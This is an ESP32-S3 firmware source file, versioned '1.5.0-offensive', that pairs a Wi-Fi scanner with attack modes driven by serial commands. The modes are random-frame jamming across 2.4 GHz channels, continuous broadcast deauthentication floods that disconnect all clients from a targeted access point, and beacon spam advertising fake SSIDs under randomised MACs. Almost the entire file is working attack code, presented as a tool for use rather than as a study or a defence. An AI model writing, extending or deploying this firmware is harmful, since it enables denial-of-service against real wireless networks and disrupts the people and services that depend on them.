/**
 * ESP32-S3 Wi-Fi Analyzer + Dual Mode Noise Jammer + Deauth/Beacon Attack
 * Version: 1.5.0 - Wideband + Single Channel + Deauth + Beacon Spam
 */

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <string.h>

#define SERIAL_BAUD       115200
#define DEFAULT_INTERVAL  5000
#define MAX_SCAN_RESULTS  30

// Global State
bool     autoScan       = false;
uint32_t scanInterval   = DEFAULT_INTERVAL;
uint32_t lastScan       = 0;
String   cmdBuffer      = "";

bool     noiseMode      = false;
bool     isWideband     = false;
uint8_t  noiseChannel   = 6;
uint32_t lastSerialCheck = 0;
uint32_t lastHopTime    = 0;
uint8_t  currentChannel = 1;

// Deauth State
bool    deauthMode      = false;
uint8_t deauthBSSID[6]  = {0};
uint8_t deauthChannel   = 1;
int     deauthCount     = 0;   // 0 = continuous
int     deauthSent      = 0;
uint32_t lastDeauthTime = 0;

// Beacon Spam State
bool    beaconMode      = false;
String  beaconSSIDPrefix = "FreeWiFi";
uint8_t beaconCount     = 10;
uint8_t beaconChannel   = 6;
uint8_t beaconIndex     = 0;
uint32_t lastBeaconTime = 0;

// ================================================================
//                     HELPERS
// ================================================================

bool parseBSSID(const String& str, uint8_t* out) {
  // Accepts "AA:BB:CC:DD:EE:FF"
  if (str.length() < 17) return false;
  for (int i = 0; i < 6; i++) {
    String b = str.substring(i * 3, i * 3 + 2);
    out[i] = (uint8_t)strtol(b.c_str(), nullptr, 16);
  }
  return true;
}

// ================================================================
//                     NOISE FUNCTIONS
// ================================================================

void startNoise(bool wideband, uint8_t ch = 6) {
  if (noiseMode) return;
  if (deauthMode) stopDeauth();
  if (beaconMode) stopBeaconSpam();
  
  isWideband = wideband;
  noiseChannel = constrain(ch, 1, 13);
  noiseMode = true;
  
  WiFi.mode(WIFI_AP);
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_set_max_tx_power(WIFI_POWER_19_5dBm);

  if (wideband) {
    Serial.println("{\"type\":\"status\",\"status\":\"wideband_on\",\"mode\":\"full_2.4ghz\"}");
  } else {
    esp_wifi_set_channel(noiseChannel, WIFI_SECOND_CHAN_NONE);
    Serial.printf("{\"type\":\"status\",\"status\":\"noise_on\",\"channel\":%d}\n", noiseChannel);
  }
}

void stopNoise() {
  if (!noiseMode) return;
  noiseMode = false;
  WiFi.mode(WIFI_STA);
  esp_wifi_set_mode(WIFI_MODE_STA);
  Serial.println("{\"type\":\"status\",\"status\":\"noise_off\"}");
}

void transmitBurst() {
  uint8_t packet[64];
  packet[0] = 0x08; packet[1] = 0x00;
  packet[2] = 0x00; packet[3] = 0x00;

  for (int i = 4; i < 64; i += 4) {
    uint32_t rnd = esp_random();
    memcpy(&packet[i], &rnd, 4);
  }

  if (isWideband) {
    currentChannel = (currentChannel % 13) + 1;
    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
  } else {
    esp_wifi_set_channel(noiseChannel, WIFI_SECOND_CHAN_NONE);
  }

  esp_wifi_80211_tx(WIFI_IF_AP, packet, 64, false);
}

// ================================================================
//                     DEAUTH FUNCTIONS
// ================================================================

void startDeauth(const String& bssid, uint8_t ch, int count) {
  if (!parseBSSID(bssid, deauthBSSID)) {
    Serial.println("{\"type\":\"error\",\"msg\":\"invalid_bssid\"}");
    return;
  }
  deauthChannel = constrain(ch, 1, 13);
  deauthCount   = count;
  deauthSent    = 0;
  deauthMode    = true;

  WiFi.mode(WIFI_AP);
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_set_max_tx_power(WIFI_POWER_19_5dBm);
  esp_wifi_set_channel(deauthChannel, WIFI_SECOND_CHAN_NONE);

  Serial.printf("{\"type\":\"status\",\"status\":\"deauth_on\",\"bssid\":\"%s\",\"channel\":%d,\"count\":%d}\n",
                bssid.c_str(), deauthChannel, count);
}

void stopDeauth() {
  if (!deauthMode) return;
  deauthMode = false;
  WiFi.mode(WIFI_STA);
  esp_wifi_set_mode(WIFI_MODE_STA);
  Serial.printf("{\"type\":\"status\",\"status\":\"deauth_off\",\"sent\":%d}\n", deauthSent);
}

void sendDeauthFrame() {
  // 802.11 deauthentication frame (broadcast — kicks all clients from AP)
  uint8_t frame[26] = {
    0xC0, 0x00,                         // Frame Control: Management / Deauth
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // DA: broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // SA: BSSID (filled below)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (filled below)
    0x00, 0x00,                         // Sequence Control
    0x07, 0x00                          // Reason: Class 3 frame from nonassoc STA
  };
  memcpy(&frame[10], deauthBSSID, 6);
  memcpy(&frame[16], deauthBSSID, 6);

  esp_wifi_set_channel(deauthChannel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
  deauthSent++;
}

// ================================================================
//                     BEACON SPAM FUNCTIONS
// ================================================================

void startBeaconSpam(const String& prefix, uint8_t count, uint8_t ch) {
  beaconSSIDPrefix = prefix;
  beaconCount      = count < 1 ? 1 : (count > 50 ? 50 : count);
  beaconChannel    = constrain(ch, 1, 13);
  beaconIndex      = 0;
  beaconMode       = true;

  WiFi.mode(WIFI_AP);
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_set_max_tx_power(WIFI_POWER_19_5dBm);
  esp_wifi_set_channel(beaconChannel, WIFI_SECOND_CHAN_NONE);

  Serial.printf("{\"type\":\"status\",\"status\":\"beacon_on\",\"prefix\":\"%s\",\"count\":%d,\"channel\":%d}\n",
                prefix.c_str(), beaconCount, beaconChannel);
}

void stopBeaconSpam() {
  if (!beaconMode) return;
  beaconMode = false;
  WiFi.mode(WIFI_STA);
  esp_wifi_set_mode(WIFI_MODE_STA);
  Serial.println("{\"type\":\"status\",\"status\":\"beacon_off\"}");
}

void sendBeaconFrame() {
  // Build SSID: prefix + index number
  String ssid = beaconSSIDPrefix;
  ssid += String(beaconIndex);
  uint8_t ssidLen = ssid.length() > 32 ? 32 : (uint8_t)ssid.length();

  // Random source MAC / BSSID for this beacon
  uint8_t mac[6];
  uint32_t r1 = esp_random(), r2 = esp_random();
  memcpy(mac, &r1, 4);
  memcpy(mac + 4, &r2, 2);
  mac[0] = (mac[0] & 0xFE) | 0x02; // Locally administered, unicast

  uint8_t frame[128];
  uint8_t pos = 0;

  // Frame Control: Beacon (0x80, 0x00)
  frame[pos++] = 0x80; frame[pos++] = 0x00;
  // Duration
  frame[pos++] = 0x00; frame[pos++] = 0x00;
  // DA: broadcast
  frame[pos++] = 0xFF; frame[pos++] = 0xFF; frame[pos++] = 0xFF;
  frame[pos++] = 0xFF; frame[pos++] = 0xFF; frame[pos++] = 0xFF;
  // SA
  memcpy(&frame[pos], mac, 6); pos += 6;
  // BSSID
  memcpy(&frame[pos], mac, 6); pos += 6;
  // Sequence Control
  frame[pos++] = 0x00; frame[pos++] = 0x00;
  // Timestamp (8 bytes)
  uint64_t ts = (uint64_t)micros();
  memcpy(&frame[pos], &ts, 8); pos += 8;
  // Beacon Interval: 100 TU
  frame[pos++] = 0x64; frame[pos++] = 0x00;
  // Capability: ESS, short preamble
  frame[pos++] = 0x21; frame[pos++] = 0x04;
  // SSID element
  frame[pos++] = 0x00;
  frame[pos++] = ssidLen;
  memcpy(&frame[pos], ssid.c_str(), ssidLen); pos += ssidLen;
  // Supported Rates element
  frame[pos++] = 0x01; frame[pos++] = 0x08;
  frame[pos++] = 0x82; frame[pos++] = 0x84; frame[pos++] = 0x8B; frame[pos++] = 0x96;
  frame[pos++] = 0x24; frame[pos++] = 0x30; frame[pos++] = 0x48; frame[pos++] = 0x6C;
  // DS Parameter Set (channel)
  frame[pos++] = 0x03; frame[pos++] = 0x01; frame[pos++] = beaconChannel;

  esp_wifi_80211_tx(WIFI_IF_AP, frame, pos, false);

  beaconIndex = (beaconIndex + 1) % beaconCount;
}

// ================================================================
//                     SCAN + COMMAND CODE (unchanged but included)
// ================================================================

String jsonEscape(const String& s) {
  String out;
  out.reserve(s.length() + 4);
  for (char c : s) {
    if (c == '"') out += "\\\"";
    else if (c == '\\') out += "\\\\";
    else if (c == '\n') out += "\\n";
    else if (c == '\r') out += "\\r";
    else if (c == '\t') out += "\\t";
    else out += c;
  }
  return out;
}

int encCode(wifi_auth_mode_t mode) {
  switch (mode) {
    case WIFI_AUTH_OPEN:         return 0;
    case WIFI_AUTH_WEP:          return 1;
    case WIFI_AUTH_WPA_PSK:      return 2;
    case WIFI_AUTH_WPA2_PSK:     return 3;
    case WIFI_AUTH_WPA_WPA2_PSK: return 4;
    case WIFI_AUTH_WPA3_PSK:     return 5;
    default:                     return 3;
  }
}

const char* bandStr(int ch) { return (ch >= 36) ? "5" : "2.4"; }

void performScan() {
  Serial.println("{\"type\":\"status\",\"msg\":\"scanning\"}");
  int n = WiFi.scanNetworks(false, true);
  if (n < 0) {
    Serial.println("{\"type\":\"error\",\"msg\":\"scan_failed\"}");
    return;
  }
  if (n > MAX_SCAN_RESULTS) n = MAX_SCAN_RESULTS;

  String json = "{\"type\":\"scan\",\"ts\":";
  json += String(millis());
  json += ",\"count\":";
  json += String(n);
  json += ",\"aps\":[";

  for (int i = 0; i < n; i++) {
    if (i > 0) json += ",";
    String ssid = WiFi.SSID(i);
    String bssid = WiFi.BSSIDstr(i);
    int rssi = WiFi.RSSI(i);
    int ch = WiFi.channel(i);
    int enc = encCode(WiFi.encryptionType(i));

    json += "{\"ssid\":\"";
    json += jsonEscape(ssid);
    json += "\",\"bssid\":\"";
    json += bssid;
    json += "\",\"ch\":";
    json += String(ch);
    json += ",\"rssi\":";
    json += String(rssi);
    json += ",\"enc\":";
    json += String(enc);
    json += ",\"band\":\"";
    json += bandStr(ch);
    json += "\"}";
  }
  json += "]}";
  Serial.println(json);
  WiFi.scanDelete();
}

void handleCommand(String cmd) {
  cmd.trim();
  String c = cmd;
  c.toUpperCase();

  if (c.startsWith("NOISE_ON")) {
    String p = cmd.substring(9);
    p.trim();
    if (p.length() == 0) {
      startNoise(true);                    // No param = Wideband
    } else {
      uint8_t ch = (uint8_t)p.toInt();
      startNoise(false, ch);
    }
  }
  else if (c == "NOISE_OFF") stopNoise();
  else if (c == "SCAN") performScan();
  else if (c == "AUTO_ON") { autoScan = true; Serial.println("{\"type\":\"status\",\"msg\":\"auto_on\"}"); }
  else if (c == "AUTO_OFF") { autoScan = false; Serial.println("{\"type\":\"status\",\"msg\":\"auto_off\"}"); }
  else if (c.startsWith("INTERVAL ")) {
    int val = c.substring(9).toInt();
    if (val >= 1 && val <= 300) scanInterval = (uint32_t)val * 1000;
  }
  else if (c.startsWith("DEAUTH_START ")) {
    // DEAUTH_START <bssid> <channel> [count]
    String args = cmd.substring(13);
    args.trim();
    int sp1 = args.indexOf(' ');
    if (sp1 < 0) { Serial.println("{\"type\":\"error\",\"msg\":\"usage: DEAUTH_START <bssid> <ch> [count]\"}"); return; }
    String bssid = args.substring(0, sp1);
    String rest = args.substring(sp1 + 1);
    rest.trim();
    int sp2 = rest.indexOf(' ');
    uint8_t ch = 1;
    int count = 0;
    if (sp2 < 0) {
      ch = (uint8_t)rest.toInt();
    } else {
      ch    = (uint8_t)rest.substring(0, sp2).toInt();
      count = rest.substring(sp2 + 1).toInt();
    }
    startDeauth(bssid, ch, count);
  }
  else if (c == "DEAUTH_STOP") stopDeauth();
  else if (c.startsWith("BEACON_START")) {
    // BEACON_START [prefix] [count] [channel]
    String args = cmd.substring(12);
    args.trim();
    String prefix = beaconSSIDPrefix;
    uint8_t count = beaconCount;
    uint8_t ch    = beaconChannel;
    if (args.length() > 0) {
      int s1 = args.indexOf(' ');
      if (s1 < 0) {
        prefix = args;
      } else {
        prefix = args.substring(0, s1);
        String rest = args.substring(s1 + 1);
        rest.trim();
        int s2 = rest.indexOf(' ');
        if (s2 < 0) {
          count = (uint8_t)rest.toInt();
        } else {
          count = (uint8_t)rest.substring(0, s2).toInt();
          ch    = (uint8_t)rest.substring(s2 + 1).toInt();
        }
      }
    }
    startBeaconSpam(prefix, count, ch);
  }
  else if (c == "BEACON_STOP") stopBeaconSpam();
  else if (c == "INFO") {
    Serial.printf("{\"type\":\"info\",\"fw\":\"1.5.0-offensive\",\"chip\":\"ESP32-S3\",\"heap\":%d}\n", ESP.getFreeHeap());
  }
}

// ================================================================
//                     SETUP + LOOP
// ================================================================

void setup() {
  Serial.begin(SERIAL_BAUD);
  delay(800);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  Serial.println("{\"type\":\"ready\",\"fw\":\"1.5.0-offensive\",\"chip\":\"ESP32-S3\"}");
}

void loop() {
  while (Serial.available()) {
    char c = (char)Serial.read();
    if (c == '\n' || c == '\r') {
      if (cmdBuffer.length() > 0) {
        handleCommand(cmdBuffer);
        cmdBuffer = "";
      }
    } else cmdBuffer += c;
  }

  if (autoScan && !noiseMode) {
    uint32_t now = millis();
    if (now - lastScan >= scanInterval) {
      lastScan = now;
      performScan();
    }
  }

  if (deauthMode) {
    uint32_t now = millis();
    if (now - lastDeauthTime >= 5) {  // ~200 frames/sec
      lastDeauthTime = now;
      sendDeauthFrame();
      if (deauthCount > 0 && deauthSent >= deauthCount) {
        stopDeauth();
      }
    }
  }

  if (beaconMode) {
    uint32_t now = millis();
    if (now - lastBeaconTime >= 100) {  // 10 beacons/sec cycling through fake SSIDs
      lastBeaconTime = now;
      sendBeaconFrame();
    }
  }

  if (noiseMode) {
    transmitBurst();
    if (millis() - lastSerialCheck >= 50) {
      lastSerialCheck = millis();
      delay(2);
    } else {
      delayMicroseconds(10);
    }
  }
}